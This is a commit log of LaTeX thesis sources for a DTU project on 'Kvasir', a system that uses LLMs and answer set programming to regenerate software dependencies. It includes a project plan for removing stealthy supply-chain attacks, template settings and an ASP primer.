     {\includegraphics[height=18.9cm,keepaspectratio]{figs/DTU_stock_photo.jpg}};
\end{tikzpicture}

\end{titlepage}

### 2025-06-20 docs/thesis/main.tex
Add thesis
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

--- 2025-06-19 paper/draft.tex
@@
-\documentclass[noacm,sigplan,review]{acmart}
-
-% \acmSubmissionID{PAPER ID}
-\renewcommand\footnotetextcopyrightpermission[1]{}
-\settopmatter{printfolios=false,printacmref=false}
-
-\usepackage{setspace}
-\usepackage{enumerate}
-\usepackage{algorithm2e}
-\usepackage{algpseudocode}
-\usepackage{graphics}
-\usepackage{xparse} 
-\usepackage{xspace}
-\usepackage{multirow}
-\usepackage{csvsimple}
-\usepackage{balance}
-\usepackage{minted}
-\usepackage{xcolor}
-\usepackage{nicefrac}
-\usepackage{siunitx}
-\usepackage{array,framed}
-\usepackage{booktabs}
-\usepackage{color}
-\usepackage{soul}
-\usepackage{float}
-\usepackage{epsfig}
-\usepackage{wrapfig}
-\usepackage{graphics}
-\usepackage{graphicx}
-\usepackage{subcaption}
-\usepackage{adjustbox}
-\usepackage{csquotes}
-\usepackage{cleveref}
-\usepackage{dirtytalk}
-\usepackage{textgreek}
-\usepackage{oplotsymbl}
-
-\def\eg{{\em e.g.}, }
-\def\ie{{\em i.e.}, }
-\def\etc{{\em etc.}\xspace}
-\def\vs{{\em vs.}\xspace}
-
-\def\gptmodel{{GPT-4o}\xspace}
-
-\newcommand{\todo}[1]{\hl{\textbf{TODO:} #1}\xspace}
-\newcommand{\sys}{{\scshape Kv{\textalpha}sir}\xspace}
-\newcommand{\rf}[1]{\ref{#1}}
-\newcommand{\sx}[1]{(\S\ref{#1})}
-\newcommand{\cf}[1]{(\emph{Cf}.\S\ref{#1})}
-\newcommand{\se}[1]{\S\ref{#1}}
-\newcommand{\fg}[1]{Fig.~\ref{#1}}
-\newcommand{\heading}[1]{\vspace{2pt}\noindent\textbf{\emph{#1}}:\enspace}
-\newcommand{\ttt}[1]{\texttt{#1}\xspace}
-\newcommand{\xxx}{\colorbox{red!30}{xxx}\xspace}
-\newcommand{\promptbox}[1]{\hspace*{-0.0135\columnwidth}\fbox{\parbox[t]{0.95\columnwidth}{\tt{#1}}}}
-
-\crefformat{section}{\S#2#1#3}
-\crefmultiformat{section}{\S#2#1#3}{--\S#2#1#3}{, \S#2#1#3}{ and \S#2#1#3}
+\documentclass[a4paper,twoside,12pt]{report} %openright
+\input{setup/statics.tex}
+\input{setup/preamble.tex}
+\input{setup/settings.tex}
 
@@
 
-\title{\sys: Controllable Program Regeneration}
-\author{Evangelos Lamprou}
+\pagenumbering{roman}
+\input{frontmatter/frontpage.tex}
+\pagecolor{white}
+\newgeometry{top=2.81cm, bottom=2.75cm, outer=2.5cm, inner=3.5cm}
+\pagestyle{empty}
+\cleardoublepage 
+\input{frontmatter/copyright.tex}
+\clearpage 
+\pagestyle{main}
+\input{frontmatter/approval.tex}
+\clearpage 
+\input{frontmatter/abstract.tex}
+\clearpage 
+\input{frontmatter/acknowledgements.tex}
+\cleardoublepage 
+\tableofcontents
+\cleardoublepage
 
-% Use cases for something like this include:
-% - program repair
-% - turning insecure code into secure code by removing side-effects
-% - transforming a program in language A to language B
-% - turning a program into a more idiomatic version of the same language
-% - having a program use a different API
-% - have a program be more amendable to parallelization
-% - have a program be more amendable to further analysis or transformation
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\pagenumbering{arabic}
 
-\begin{abstract}
-Modern software systems are constantly evolving—requiring developers to
-  refactor legacy code, adapt to changing APIs, translate across languages, and
-  patch security vulnerabilities. These transformations are often brittle,
-  manual, and error-prone. Large language models (LLMs) offer new opportunities
-  for automating such tasks, but their outputs are shaped by surface cues, lack
-  semantic guarantees, and require brittle prompting strategies. This paper
-  presents \sys, a system for controllable program regeneration that combines
-  logic-based planning with LLM-guided synthesis.
-  By expressing transformation
-  goals as declarative constraints over program properties---such as input/output
-  behavior, side-effect freedom, language, or modular structure, \sys
-  regenerates code that satisfies explicit semantic requirements.
-  We demonstrate \sys across a wide range of tasks, including security
-  hardening, language translation, and idiomatic rewriting, and highlight its
-  ability to deliver interpretable, high-quality transformations with minimal
-  developer guidance.
-\end{abstract}
-\maketitle
-
-\section{Introduction}
+\chapter{Introduction}
 \begin{figure}[t]
@@
 
-% TODO: Add section references
+% TODO: Add chapter references
 \heading{Contributions}
@@
 
-\section{Example}
+\chapter{Example}
 \label{sec:example}
@@
 
-This section shows the application of \sys
+This chapter shows the application of \sys
 to three distinct program transformation tasks, 
@@
 
-\section{\sys Design}
+\chapter{\sys Design}
 \label{sec:design}
@@
 
-\section{Property Language and Extraction}
+\chapter{Property Language and Extraction}
 \label{sec:dsl}
@@
 
-\section{Synthesis Plan}
+\chapter{Synthesis Plan}
 \label{sec:synthesis}
@@
 
-\section{Property Verification and Feedback Loop}
+\chapter{Property Verification and Feedback Loop}
 \label{sec:verification}
@@
 
-\section{Evaluation}
+\chapter{Evaluation}
 \label{sec:evaluation}
@@
 
-\subsection{Benchmarks \& Methodology}
+\section{Benchmarks \& Methodology}
 
@@
   Benchmark programs come from online repositories, public archives, security research datasets, and often referenced examples in programming culture.
-  The $N$ column shows the number of programs/functions from each benchmar.
+  The N column shows the number of programs/functions from each benchmar.
   }
@@
 \toprule
-Benchmark                          & Description         & $N$ & Source \\
+Benchmark                          & Description         & N & Source \\
 \midrule
@@
 
-\subsection{Q1: Correctness and Regeneration Quality}
+\section{Q1: Correctness and Regeneration Quality}
 
@@
 
-\subsection{Q2: Naive LLM vs. \sys}
+\section{Q2: Naive LLM vs. \sys}
 
@@
 
-\subsection{Q3: Planning Efficiency \& Precision}
+\section{Q3: Planning Efficiency \& Precision}
 
@@
 
-\section{Related Work}
+\chapter{Related Work}
 
@@
 
-\section{Discussion and Limitations}
+\chapter{Discussion and Limitations}
 \label{sec:discussion}
@@
 
-\section{Conclusion}
+\chapter{Conclusion}
 This paper introduced \sys, a system for property-guided program regeneration
@@
 correctness, explainability, and developer control as first-class citizens.
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
-\bibliographystyle{ACM-Reference-Format}
-\bibliography{bib.bib}
-
+\printbibliography[heading=bibintoc,title={Bibliography}]
+\cleardoublepage 
 \appendix
-
-\section{A Primer on Answer Set Programming (ASP)}
-\label{sec:asp}
-
-\emph{Answer Set Programming (ASP)} is a declarative logic programming paradigm
-that generalizes Datalog by supporting nonmonotonic reasoning,
-negation-as-failure, and optimization. \sys uses ASP to represent and solve
-regeneration planning tasks by encoding properties, constraints, and goals as
-logic rules.
-
-\heading{From Datalog to ASP}
-Like Datalog, ASP programs consist of rules of the form:
-\begin{verbatim}
-head :- body.
-\end{verbatim}
-
-But unlike Datalog
-ASP supports \emph{negation-as-failure} using \texttt{not}
-ASP allows \emph{disjunctions} and \emph{constraints}
-ASP evaluates programs under the \emph{stable model semantics}, which may yield
-multiple answer-sets (models), each representing a consistent solution
-
-\heading{Example: Feature Selection}
-\begin{verbatim}
-{ select(a); select(b); select(c) }.
-
-:- select(a), select(b).   % a and b are incompatible
-
-#maximize { X : select(X) }.   % Prefer selecting more features
-\end{verbatim}
-
-This program searches over subsets of \texttt{\{a,b,c\}}, excludes those
-violating constraints, and returns models with maximal selections.
+\input{backmatter/appendix.tex}
+\cleartoleftpage
+\input{backmatter/backpage.tex}
 

### 2025-06-20 docs/thesis/plan.tex
Add thesis
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

\documentclass[a4paper,twoside,11pt]{report} %openright
\usepackage{lipsum}
\usepackage{pgfgantt}
\usepackage{adjustbox}

\input{setup/statics.tex}
\input{setup/preamble.tex}
\input{setup/settings.tex}

\begin{document}

\pagenumbering{roman}
\input{frontmatter/frontpage.tex}
\pagecolor{white}
\newgeometry{top=2.81cm, bottom=2.75cm, outer=2.5cm, inner=3.5cm}
\pagestyle{empty}
\pagestyle{main}

\section*{Abstract}
Supply-chain attacks have been an ongoing issue in the software industry,
resulting in large financial damages in recent years. These attacks target a
victim’s supplier, exploiting the fact that the victim software depends on
software provided by the supplier. As modern software consists of thousands of
dependencies, it is challenging for developers to audit all dependencies—and
particularly so for dependencies nested deeply in the dependency chain.
Automated detection of such attacks remains challenging, as malicious
components use various evasion techniques. Specifically, in the case of
stealthy supply-chain attacks (SSCAs), a malicious dependency may remain
dormant until multiple conditions are met, for example, specific values of
environment variables, the version of another component, the system’s date and
time, the number of times a component has been invoked, or even random
activation. This vast space of possible conditions makes detection extremely
complex and highly unlikely.

\section*{Literature Review}
Large language models (LLMs) have been explored for security
applications~\cite{alkaraki2024exploringllmsmalwaredetection, llmvulndetection2023}, 
but they remain vulnerable when source code is
unavailable or malicious code is disguised as legitimate functionality; This project
will mitigate these risks by regenerating components to eliminate side-effectful
attacks.

Program synthesis approaches~\cite{harp:ccs:2021, feser2015synthesizing,
gulwani2011automating} use formal methods to generate programs from
specifications or examples, whereas this project will leverage LLMs for regeneration
without domain-specific constraints, allowing cross-domain scalability.

Software de-bloating~\cite{brown2024broad, babak2019less, kalhauge:2019:binary-reduction} removes unused code
to reduce attack surfaces, but this project will regenerate entire libraries from scratch,
eliminating all non-essential or potentially malicious functionality while
preserving expected behavior.

Vulnerability detection~\cite{Calzavara2015, maffeis2009language} employs
static and dynamic analysis to identify security flaws, whereas this project will bypass
detection by regenerating components into vulnerability-free versions with
equivalent functionality.

\section*{Methodology}
I propose to develop a system that eliminates SSCAs by combining program
inference, transformation, and regeneration. The key insight behind my system
is that a stealthy malicious component still exhibits the advertised component
behavior—which the system will attempt to infer and regenerate. The system will
not attempt to directly detect, remove, or interpose on vulnerable or malicious
code. It instead extracts a model of the component’s intended behavior, then
uses this model to regenerate a new, secure, vulnerability-free version of the
component. While earlier research on vulnerability elimination has demonstrated
promising results via active learning and regeneration, the techniques
underlying this system will be language- and domain-agnostic, hinting at a
potential for regenerating substantial parts of entire ecosystems.

\section*{Project Plan}

The project will be conducted over a period of 6 months, starting in February 2025 and ending in July 2025. The project will be divided into the following phases:

First, I will study
real-world examples of stealthy supply-chain attacks, such as leetlog~\cite{leetlog-attack}
and
flatmap-stream~\cite{snyk-flatmapstream-2018, ev:eurosec:2022}, to understand how attackers hide malicious behavior in software
components. 
I will review existing detection and mitigation techniques,
including static analysis methods like AST-based detection and taint analysis,
as well as dynamic analysis approaches that observe runtime behavior.
I will
also evaluate LLM-based vulnerability detection and program synthesis
techniques to assess their effectiveness. To define the scope of the system, I
will determine which programming languages to support initially, focusing on
JavaScript and Node.js, with potential expansion to Python and C++.
I will
establish metrics for correctness, such as code coverage and functional
equivalence tests, and decide which types of attacks to target.

Next, I will develop a component that extracts
the interfaces of software components and generate the necessary input-output
pairs.
I will implement a parser to extract function signatures, imports, and
global variables while resolving dependencies in multi-module projects.
I will
design LLM prompts to generate sample inputs for testing component behavior and
implement a sandboxed execution environment to safely run these inputs against
the original library. I will store successful I/O pairs and identify cases
where code execution behaves inconsistently, in order to identify the limitations of this specific approach.

Next, I will develop the next component that uses the extracted I/O pairs to
synthesize
executable code using LLM-based synthesis until the correctness threshold is
met.
To ensure functional equivalence, the system will also execute developer-provided test
suites on the regenerated code. If necessary, I will
implement an early-exit mechanism to discard libraries that contain irreducible
complexity, rely on undocumented system behaviors, or generate
non-deterministic outputs such as timestamps or randomly triggered functions.

Moving on, I will
introduce mechanisms for refinement, and parallelization.
I will develop a revision loop that continuously expands the input set to
improve coverage and iteratively refines synthesized code until correctness
conditions are satisfied.
To improve scalability, I will enable parallel processing,
allowing multiple components to be regenerated simultaneously.

Finally, I will assess the performance
and reliability of the system across multiple software components.
I will test
it on benign libraries to ensure no unintended modifications are introduced and
apply it to known malicious packages, such as flatmap-stream and leetlog, to
confirm that vulnerabilities are successfully eliminated.
I will also introduce
synthetic test cases to simulate stealthy behaviors and evaluate the system’s
effectiveness.
To benchmark its capabilities, I will compare its performance
against pure LLM-based vulnerability elimination, traditional static and
dynamic analysis tools, and search-based program synthesis techniques.

\begin{adjustbox}{max width=\textwidth}
\begin{ganttchart}[
    x unit=0.1cm, y unit chart=0.7cm,
    vgrid, hgrid,
    milestone label node/.append style={text width=4cm},
    time slot format=isodate,
    today=2025-03-18
]{2025-02-01}{2025-08-31}

  % Define months
  \gantttitlecalendar{month=name} \\

  % Literature Review
  \ganttbar[
    progress=40,
    name=litreview
  ]{Literature Review}{2025-02-01}{2025-03-28} \\

  % Define Component Behavior (Starts after Literature Review)
  \ganttbar[
    progress=50,
    name=definecomp
  ]{Define Component Behavior}{2025-03-01}{2025-03-31} \\

  % Develop Inference Component (Runs in Parallel with Regeneration)
  \ganttbar[
    progress=30,
    name=inference
  ]{Develop Inference Component}{2025-03-15}{2025-04-30} \\

  % Develop Regeneration Component (Runs in Parallel with Inference)
  \ganttbar[
    progress=10,
    name=regen
  ]{Develop Regeneration Component}{2025-03-15}{2025-05-31} \\

  % Develop Basic Prototype (Starts After Initial Progress on Inference/Regeneration)
  \ganttbar[
    progress=70,
    name=prototype
  ]{Develop Basic Prototype}{2025-04-01}{2025-05-31} \\

  % Evaluation on Simple Libraries (Extends Slightly to Overlap with Basic Prototype)
  \ganttbar[
    progress=20,
    name=evaluation
  ]{Evaluate on Simple Libraries}{2025-04-15}{2025-05-31} \\

  % Develop Complete Prototype (Includes Subtasks)
  \ganttgroup{Develop Complete Prototype}{2025-06-01}{2025-07-31} \\
  \ganttbar[
    progress=0,
    name=coverage
  ]{Implement Coverage Metrics}{2025-06-01}{2025-06-15} \\
  \ganttbar[
    progress=0,
    name=heuristics
  ]{Integrate Heuristics}{2025-06-10}{2025-06-30} \\
  \ganttbar[
    progress=0,
    name=earlyexit
  ]{Implement Early Exit Mechanism}{2025-07-01}{2025-07-15} \\

  % Expand Evaluation
  \ganttbar[
    progress=10,
    name=expand
  ]{Expand Evaluation}{2025-07-15}{2025-08-15} \\

  % Dependencies (Updated for New Tasks)
  \ganttlink{litreview}{definecomp}
  \ganttlink{definecomp}{inference}
  \ganttlink{definecomp}{regen}
  \ganttlink{inference}{prototype}
  \ganttlink{regen}{prototype}
  \ganttlink{prototype}{evaluation}
  \ganttlink{evaluation}{coverage}
  \ganttlink{evaluation}{heuristics}
  \ganttlink{evaluation}{earlyexit}
  \ganttlink{coverage}{expand}
  \ganttlink{heuristics}{expand}
  \ganttlink{earlyexit}{expand}

\end{ganttchart}
\end{adjustbox}

Throughout the project, I will be preparing the thesis text, giving weekly updates to my advisor, and meeting with my advisor bi-weekly, or as needed.

\subsection*{Expected Challenges and Open Questions}

One challenge in evaluating functional equivalence is dealing with incomplete
test coverage. If a function is only partially tested, the regenerated version
may miss critical behaviors that are not explicitly captured in the provided
input-output pairs. This can result in functionally incorrect but superficially
valid implementations. To mitigate this, I will explore the use of fuzz testing
to generate additional inputs, ensuring that the regenerated component is
exercised across a wider range of possible behaviors. By leveraging automated
input generation techniques, I aim to improve test coverage and reduce the
likelihood of missing important edge cases.

Another challenge lies in scaling beyond JavaScript and Node.js to support
additional languages such as Python, Rust, or C++. Each language presents
unique challenges when it comes to actually interacting with it.
To address this, I will modularize the input-generation
logic, allowing for language-specific extensions. This will enable
adaptation to different programming languages while maintaining a consistent
approach to program inference and regeneration across multiple ecosystems.

\subsection*{Resources}

The primary resources required for this project are as follows:

\begin{enumerate}
    \item Access to the OpenAI API to use as the LLM backend.
    \item Access to an open-source model API to use as an alternative LLM backend.
    \item Access to open source library repositories such as npm, PyPI, and crates.io.
\end{enumerate}

\section*{Expected Outcomes}
By the end of the project, I will have built a system that will produce as
output either a vulnerability-free version of a software component it takes as
input or a message that it cannot operate on its input component, because the
component falls outside its regeneration scope.

The deliverables for this project will include the following:

\begin{itemize}
  \item	CLI Tool: A fully functional command-line tool for regenerating dependencies.
	\item	Benchmarking Report: A detailed evaluation of the system's effectiveness across real-world packages.
	\item	Open Source Release: Release as an MIT-licensed project on GitHub.
\end{itemize}

\printbibliography[heading=bibintoc,title={Bibliography}]
\input{backmatter/backpage.tex}

\end{document}

### 2025-06-20 docs/thesis/setup/preamble.tex
Add thesis
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

%\usepackage{microtype}      % better looking text
%\usepackage[utf8]{inputenc}
\usepackage{fontspec}       % Package for custom fonts
\usepackage[]{geometry}     % Package for changing page margins (before fancyhdr) 
\usepackage{fancyhdr}       % Package to change header and footer
\usepackage{parskip}        % Package to tweak paragraph skipping (instead of indents a small skip is added after every paragraph)
\usepackage{titlesec}
\usepackage{tikz}           % Package for drawing
\usepackage{pgfplots}       % Package for creating graphs and charts
\usepackage{xcolor}         % Package for defining DTU colours to be used
\usepackage{amsmath}        % For aligning equations among other
\usepackage{siunitx}        % SI units
\usepackage{listings}       % Package for inserting code, (before cleveref)
\PassOptionsToPackage{hyphens}{url} % Ability to line break urls at hyphens
\usepackage{hyperref}       % Package for cross referencing (also loads url package)
\usepackage{cleveref}       % improved cross referencing
\usepackage{textcomp}       % \textdegree = °C and other useful symbols
\usepackage[english]{babel} % localisation 
\usepackage{caption}        % better captions
\usepackage{subcaption}     % for subfigures
\usepackage{csquotes}       % For biblatex with babel
\usepackage[backend=biber,style=numeric,sorting=none]{biblatex} % Package for bibliography (citing)
\bibliography{bibliography.bib}
\usepackage{tabularx}       % for ability to adjust column spacing in tabular better
\usepackage{booktabs}       % for better tables
\usepackage{float}          % floating figures in correct places
\usepackage{calc}           % Adds ability for latex to calculate (3pt+2pt) 
\usepackage{blindtext}
\usepackage{minted}
\usepackage{dirtytalk}
\usepackage{textgreek}
\usepackage{cleveref}
\usepackage{wrapfig}

### 2025-06-20 docs/thesis/setup/settings.tex
Add thesis
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

% Colours! 
\newcommand{\targetcolourmodel}{cmyk} % rgb for a digital version, cmyk for a printed version. Only use lowercase
\selectcolormodel{\targetcolourmodel}

% Define colours from https://www.designguide.dtu.dk/
\definecolor{dtured}    {rgb/cmyk}{0.6,0,0 / 0,0.91,0.72,0.23}
\definecolor{blue}      {rgb/cmyk}{0.1843,0.2431,0.9176 / 0.88,0.76,0,0}
\definecolor{brightgreen}{rgb/cmyk}{0.1216,0.8157,0.5098 / 0.69,0,0.66,0}
\definecolor{navyblue}  {rgb/cmyk}{0.0118,0.0588,0.3098 / 1,0.9,0,0.6}
\definecolor{yellow}    {rgb/cmyk}{0.9647,0.8157,0.3019 / 0.05,0.17,0.82,0}
\definecolor{orange}    {rgb/cmyk}{0.9882,0.4627,0.2039 / 0,0.65,0.86,0}
\definecolor{pink}      {rgb/cmyk}{0.9686,0.7333,0.6941 / 0,0.35,0.26,0}
\definecolor{grey}      {rgb/cmyk}{0.8549,0.8549,0.8549 / 0,0,0,0.2}
\definecolor{red}       {rgb/cmyk}{0.9098,0.2471,0.2824 / 0,0.86,0.65,0}
\definecolor{green}     {rgb/cmyk}{0,0.5333,0.2078 / 0.89,0.05,1,0.17}
\definecolor{purple}    {rgb/cmyk}{0.4745,0.1373,0.5569 / 0.67,0.96,0,0}

\newcommand{\dtulogocolour}{white} % Colour of the DTU logo: white, black or dtured
\newcommand{\frontpagetextcolour}{white} % front page text colour: white or black
\colorlet{frontbackcolor}{blue} % Set the background colour of the front- and back page. Choose the colour so it matches the main colour of front page picture

% DTU colours for diagrams
% You might want to make the front/back page background colour the first colour in the plot cycle list.
\pgfplotscreateplotcyclelist{DTU}{%
dtured,         fill=dtured,        \\%
blue,           fill=blue,          \\%
brightgreen,    fill=brightgreen    \\%
navyblue,       fill=navyblue       \\%
yellow,         fill=yellow         \\%
orange,         fill=orange         \\%
grey,           fill=grey           \\%
red,            fill=red            \\%
green,          fill=green          \\%
purple,         fill=purple         \\%
}

% Font
% There is no corporate serif font in the DTU design guide. The DTU design team has proposed to use Neo Sans for headings - and Arial for the body text.
% To change heading font to NeoSans Pro please upload both NeoSansPro-Regular.otf and NeoSansPro-Medium.otf to the root directory.
\setmainfont{Arial}
\renewcommand\thepart{Part \Roman{part}}
\IfFontExistsTF{NeoSansPro-Medium.otf}
{ %If True set headings to NeoSans Pro
\newfontface\NeoSansProReg{NeoSansPro-Regular.otf}
\newfontface\NeoSansProMed{NeoSansPro-Medium.otf}
\titleformat{\part}[display]{\NeoSansProMed \huge \centering}{\NeoSansProMed \Huge \thepart}{1em}{\thispagestyle{empty}}{}
\titleformat{\chapter}{\NeoSansProMed\huge}{\thechapter}{1em}{\raggedright}
\titleformat{\section}{\NeoSansProMed\Large}{\thesection}{1em}{\raggedright}
\titleformat{\subsection}{\NeoSansProMed\large}{\thesubsection}{1em}{\raggedright}
\titleformat{\subsubsection}{\NeoSansProMed\normalsize}{\thesubsubsection}{1em}{\raggedright}
\newcommand\TitleFont[1]{{\NeoSansProMed #1}}
\newcommand\titlefont[1]{{\NeoSansProReg #1}}
}
{ % If false
\titleformat{\part}[display]{\bfseries\huge \centering}{\bfseries\Huge \thepart}{1em}{\thispagestyle{empty}}{}
\titleformat{\chapter}{\bfseries\huge}{\thechapter}{1em}{\raggedright}
\titleformat{\section}{\bfseries\Large}{\thesection}{1em}{\raggedright}
\titleformat{\subsection}{\bfseries\large}{\thesubsection}{1em}{\raggedright}
\titleformat{\subsubsection}{\bfseries\normalsize}{\thesubsubsection}{1em}{\raggedright}
\newcommand\TitleFont[1]{{\bfseries #1}}
\newcommand\titlefont[1]{{#1}}
}
\urlstyle{sf}
%\def\UrlFont{\NeoSansProReg}

% If you wish to use the pdflatex compiler, sans-serif Helvetica can be used as a replacement for Arial. In this way you will be able to use the microtype package. Remember to add \usepackage[utf8]{inputenc} and disable the fontspec package. 
%\newcommand\TitleFont[1]{{\bfseries #1}}
%\newcommand\titlefont[1]{{#1}}
%\fontfamily{qhv}\selectfont
%\renewcommand{\familydefault}{\sfdefault}

% Table of contents (TOC) and numbering of headings
\setcounter{tocdepth}{1}    % Depth of table of content: sub sections will not be included in table of contents
\setcounter{secnumdepth}{2} % Depth of section numbering: sub sub sections are not numbered

\makeatletter % Reset chapter numbering for each part
\@addtoreset{chapter}{part}
\makeatother

% Spacing of titles and captions
\titlespacing\chapter{0pt}{0pt plus 4pt minus 2pt}{4pt plus 2pt minus 2pt}
\titlespacing\section{0pt}{12pt plus 3pt minus 3pt}{2pt plus 1pt minus 1pt}
\titlespacing\subsection{0pt}{8pt plus 2pt minus 2pt}{0pt plus 1pt minus 1pt}
\titlespacing\subsubsection{0pt}{4pt plus 1pt minus 1pt}{-2pt plus 1pt minus 1pt}
\captionsetup{belowskip=\parskip,aboveskip=4pt plus 1pt minus 1pt}

% Setup header and footer
\fancypagestyle{main}{% All normal pages
    \fancyhead{}
    \fancyfoot{}
    \renewcommand{\headrulewidth}{0pt}
    \fancyfoot[LE,RO]{\footnotesize \thepage}
    \fancyfoot[RE,LO]{\footnotesize \thesistitle} % - \rightmark
    \fancyhfoffset[E,O]{0pt}
}
\fancypagestyle{plain}{% Chapter pages
    \fancyhead{}
    \fancyfoot{}
    \renewcommand{\headrulewidth}{0pt}
    \fancyfoot[LE,RO]{\footnotesize \thepage}
    \fancyfoot[RE,LO]{\footnotesize \thesistitle} % - \leftmark
    \fancyhfoffset[E,O]{0pt}
}

% Setup for diagrams and graphs (tikz pictures) 
\usetikzlibrary{spy}    % For magnifying anything within a tikzpicture, see the line graph
\usepgfplotslibrary{statistics} % Package for the boxplot
\pgfplotsset{ % Setup for diagrams
compat=newest,
major x grid style={line width=0.5pt,draw=grey},
major y grid style={line width=0.5pt,draw=grey},
legend style={at={(0.5,-0.1)}, anchor=north,fill=none,draw=none,legend columns=-1,/tikz/every even column/.append style={column sep=10pt}},
axis line style={draw=none},
tick style={draw=none},
every axis/.append style={ultra thick},
tick label style={/pgf/number format/assume math mode}, % To apply main font to tick labels (numbers on the axis)
}
\tikzset{every mark/.append style={scale=1.5}}

% Hypersetup
\hypersetup{
    pdfauthor={\thesisauthor},
    pdftitle={\thesistitle},
    pdfsubject={\thesissubtitle},
    pdfdisplaydoctitle,
    bookmarksnumbered=true,
    bookmarksopen,
    breaklinks,
    linktoc=all,
    plainpages=false,
    unicode=true,
    colorlinks=false,
    hidelinks,                        % Do not show boxes or coloured links.
}

% Listings setup
\lstset{
    basicstyle=\footnotesize\ttfamily,% the size of the fonts that are used for the code
    commentstyle=\color{green},       % comment style
    keywordstyle=\bfseries\ttfamily\color{blue}, % keyword style
    numberstyle=\sffamily\tiny\color{grey}, % the style that is used for the line-numbers
    stringstyle=\color{purple},       % string literal style
    rulecolor=\color{grey},           % if not set, the frame-color may be changed on line-breaks within not-black text (e.g. comments (green here))
    breakatwhitespace=false,          % sets if automatic breaks should only happen at whitespace
    breaklines=true,                  % sets automatic line breaking
    captionpos=b,                     % sets the caption-position to bottom
    deletekeywords={},                % if you want to delete keywords from the given language
    escapeinside={\%*}{*)},           % if you want to add LaTeX within your code
    frame=single,                     % adds a frame around the code
    xleftmargin=4pt, 
    morekeywords={*,...},             % if you want to add more keywords to the set
    numbers=left,                     % where to put the line-numbers; possible values are (none, left, right)
    numbersep=10pt,                   % how far the line-numbers are from the code
    showspaces=false,                 % show spaces everywhere adding particular underscores; it overrides 'showstringspaces'
    showstringspaces=false,           % underline spaces within strings only
    showtabs=false,                   % show tabs within strings adding particular underscores
    stepnumber=1,                     % the step between two line-numbers. If it's 1, each line will be numbered
    tabsize=2,                        % sets default tabsize to 2 spaces
    title=\lstname,                   % show the filename of files included with \lstinputlisting; also try caption instead of title
}

% Signature field
\newlength{\myl}
\newcommand{\namesigdatehrule}[1]{\par\tikz \draw [black, densely dotted, very thick] (0.04,0) -- (#1,0);\par}
\newcommand{\namesigdate}[2][]{%
\settowidth{\myl}{#2}
\setlength{\myl}{\myl+10pt}
\begin{minipage}{\myl}%
\begin{center}
    #2  % Insert name from the command eg. \namesigdate{\authorname}
    \vspace{1.5cm} % Spacing between name and signature line 
    \namesigdatehrule{\myl}\smallskip % Signature line and a small skip
    \small \textit{Signature} % Text under the signature line "Signature"
    \vspace{1.0cm} % Spacing between "Signature" and the date line
    \namesigdatehrule{\myl}\smallskip % Date line and a small skip
    \small \textit{Date} % Text under date line "Date" 
\end{center}
\end{minipage}
}

% For the back page: cleartoleftpage
\newcommand*\cleartoleftpage{%
  \clearpage
  \ifodd\value{page}\hbox{}\newpage\fi
}

\def\eg{{\em e.g.}, }
\def\ie{{\em i.e.}, }
\def\etc{{\em etc.}\xspace}
\def\vs{{\em vs.}\xspace}

\def\gptmodel{{GPT-4o}\xspace}

\newcommand{\todo}[1]{\hl{\textbf{TODO:} #1}\xspace}
% \newcommand{\sys}{{\scshape Kv{\textalpha}sir}\xspace}
\newcommand{\sys}{{\scshape Kvasir}\xspace}
\newcommand{\rf}[1]{\ref{#1}}
\newcommand{\sx}[1]{(\S\ref{#1})}
\newcommand{\cf}[1]{(\emph{Cf}.\S\ref{#1})}
\newcommand{\se}[1]{\S\ref{#1}}
\newcommand{\fg}[1]{Fig.~\ref{#1}}
\newcommand{\heading}[1]{\vspace{2pt}\noindent\textbf{\emph{#1}}:\enspace}
\newcommand{\ttt}[1]{\texttt{#1}\xspace}
\newcommand{\xxx}{\colorbox{red!30}{xxx}\xspace}
\newcommand{\promptbox}[1]{\hspace*{-0.0135\columnwidth}\fbox{\parbox[t]{0.95\columnwidth}{\tt{#1}}}}

\crefformat{section}{\S#2#1#3}
\crefmultiformat{section}{\S#2#1#3}{--\S#2#1#3}{, \S#2#1#3}{ and \S#2#1#3}

### 2025-06-21 docs/thesis/backmatter/appendix.tex
Text improvements
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

\chapter{Appendix}

\section{Short Introduction to ASP}

Answer Set Programming (ASP) \cite{Gelfond_2000, Eiter_2009} is a problem-solving paradigm with roots in logic programming and non-monotonic reasoning.
The programming 
model of ASP is one where the programmer models
the problem domain, with the solution being handled by a solver program.
Programming using this paradigm is done in a family of languages sometimes called \textit{AnsProlog} \cite{Gelfond_2002}.
In our work, we will be using the input language of \textit{Clingo} \cite{DBLP:journals/corr/GebserKKS14}, which 
is a high-performance integrated solver with a large collection of libraries and bindings helpful in integrating it with external tools.

The syntax, similar to that of \textit{Prolog} and \textit{Datalog}, with code and data being represented
through logical terms. Collections of logical terms, as seen in
\cref{lst:terms}, can represent the game world's state. Rules, expressed using
the \texttt{:-} operator, enable complex reasoning by defining relationships
between atoms. Choice rules, exemplified in \cref{lst:choice}, allow the ASP
solver to make selections among atoms. Integrity constraints, as shown in
\cref{lst:constraint}, can restrict invalid answer sets. Optimization
directives, such as \texttt{\#minimize} and \texttt{\#maximize} in
\cref{lst:optimization}, guide the solver to output optimal answer sets.

\begin{lstlisting}[caption={A set of facts over a program.}, label=lst:terms]{Name}
language(p, javascript).

\end{lstlisting}

\begin{lstlisting}[caption={Logic rules describing relationships between the original and regenerated program.}]{Name}
graph(p_) :- graph(p).
len(p_, N) :- len(p, N_), N = N_ + 1.
\end{lstlisting}

\begin{lstlisting}[caption={A choice rule.}, label=lst:choice]{Name}
{absent(F) : function(F, P)} :- program(P).
\end{lstlisting}

\begin{lstlisting}[caption={An integrity constraint.}, label=lst:constraint]{Name}
:- language(p, X), language(p_, Y), X != Y.
\end{lstlisting}

\begin{lstlisting}[caption={An optimization directive.}, label=lst:optimization]{Name}
#minimize{C : cost(E,C)}.
\end{lstlisting}

% To compute answer sets, ASP programs are input into ASP solvers.
% These solvers provide efficient mechanisms to generate the set of valid answers to the given problem.
% An ASP solver can be thought of as a black box, with them being interchangeable as 
% long as the input language semantics remain the same.

### 2025-06-21 docs/thesis/frontmatter/abstract.tex
Text improvements
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
